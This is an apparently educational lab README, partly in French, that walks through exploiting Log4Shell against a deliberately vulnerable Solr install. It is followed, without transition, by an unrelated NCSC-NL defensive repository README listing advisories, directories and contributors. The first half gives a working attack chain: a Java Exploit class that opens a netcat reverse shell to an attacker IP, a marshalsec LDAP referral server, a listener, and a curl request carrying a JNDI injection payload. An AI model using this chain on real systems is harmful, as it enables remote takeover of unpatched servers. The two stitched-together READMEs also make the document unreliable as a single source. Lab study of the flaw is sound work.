# ENI Veille SSI Log4Shell

Pour réalisez l'attaque présente dans la vidéo, vous devez créez 2 machines virtuels

Dans le première machine qui sera celle de la victime, vous devrez installer une version vulnérable de Solr

## 1. Install Java on victim
Install Java.
```
$ sudo apt install default-jdk -y
```
Verify the Java installation.
```
$ java -version
```
Download Solr :
```
wget https://archive.apache.org/dist/lucene/solr/7.7.3/solr-7.7.3-src.tgz 
```

Install Apache Solr.
```
$ sudo bash solr-7.7.3/bin/install_solr_service.sh solr-7.7.3-src.tgz 
```
Check the status of the Apache Solr service.

```
$ sudo systemctl status solr
```
Enable the Apache Solr service to start on system boot.
```
$ sudo systemctl enable solr
```
Allow port 8983 through the UFW firewall.
```
$ sudo ufw allow 8983
```
To access the Apache Solr web interface, go to your browser and enter http://serverIP:8983.

## 2 Prepare attack :

The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec

## exploit java :
```
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 4444");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Compiler le code java :
```
javac Exploit.java -source 8 -target 8
```

## Attack

Création du serveur python :
```
python3 -m http.server
```

Prepare a netcat listener on any port of your choosing :

```
nc -lnvp 4444
````
Execut ldap server :
```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"
```

Attack :
```
curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'
```


# Log4shell vulnerabilities (CVE-2021-44228, CVE-2021-45046, CVE-2021-4104, CVE-2021-45105)

This repo contains operational information regarding the Log4shell vulnerability in the Log4j logging library. 
Especially CVE-2021-44228 / CVE-2021-45046 and also covers CVE-2021-4104 / CVE-2021-45105. For additional information see:

* [NCSC-NL advisory](https://www.ncsc.nl/actueel/advisory?id=NCSC-2021-1052)
* [MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)
* [EU CSIRT network members advisories, maintained by ENISA](https://github.com/enisaeu/CNW/tree/main/log4shell)
* [Log4shell vulnerability overview](https://github.com/NCSC-NL/log4shell/blob/main/log4shell_en.png)

For affected organisations and CISOs searching for concise mitigation guidance, the [Log4Shell for OES - Full presentation slides for CISOs and techies](https://github.com/NCSC-NL/log4shell/blob/main/detection_mitigation/Log4Shell%20for%20OES.pdf) describes the vulnerability and explains **all steps** necessary to successfully mitigate the vulnerability (**patching is not enough**).

## Repository contents

| Directory                          | Purpose |
|:-----------------------------------|:--------|
| [hunting](hunting/README.md)       | Contains info regarding hunting for exploitation |
| [iocs](iocs/README.md)             | Contains any Indicators of Compromise, such as scanning IPs, etc |
| [detection & mitigation](detection_mitigation/README.md)   | Contains info regarding detection and mitigation, such as regexes for detecting scanning activity and more |
| [scanning](scanning/README.md)     | Contains references to methods and tooling used for scanning for the Log4j vulnerability |
| [software](software/README.md)     | Contains a list of known vulnerable and not vulnerable software |
| [tools](tools/README.md)           | Contains a list of tools for automatically parsing info on this repo |

**Please note that these directories are not complete, and are currently being expanded.**

**NCSC-NL has published a HIGH/HIGH advisory for the Log4j vulnerability. Normally we would update the HIGH/HIGH advisory for vulnerable software packages, however due to the extensive amounts of expected updates we have created a list of known vulnerable software in the software directory.**

## Contributions welcome

If you have any additional information to share relevant to the Log4j vulnerability, please feel free to open a Pull request. New to this? [Read how to contribute in GitHub's documentation](https://docs.github.com/en/repositories/working-with-files/managing-files/editing-files#editing-files-in-another-users-repository).

### Hall of fame

We would like to thank every single one of you that contributed to our GitHub page.
NCSC-NL believes the GitHub page is a succes and you made that possible.
Below we present a very incomplete list of contributants we consider the repository's hall of fame:

* [ANSSI](https://www.ssi.gouv.fr/en/)
* [BSI/CERT-Bund](https://www.bsi.bund.de/EN/Topics/IT-Crisis-Management/CERT-Bund/cert-bund_node.html)
* [CERT-EU](https://cert.europa.eu/cert/plainedition/en/cert_about.html)
* [Cybersecurity & Infrastructure Security Agency CISA](https://www.cisa.gov/about-cisa)
* [DCSC](https://www.defensie.nl/onderwerpen/cyber-security/dcsc)
* [SURFcert](https://wiki.surfnet.nl/pages/viewpage.action?pageId=11063492)
* [SK-CERT](https://www.sk-cert.sk/en/about-us/index.html)
* [Z-CERT](https://www.z-cert.nl/)

* @DFFSpace
* @tintinhamans
* @milankowww
* @MrSeccubus
* @Goldshop
* @RemkoSikkema
* @MetzieNL
* @RobinFlikkema
* @lucasjellema
* @iglocska
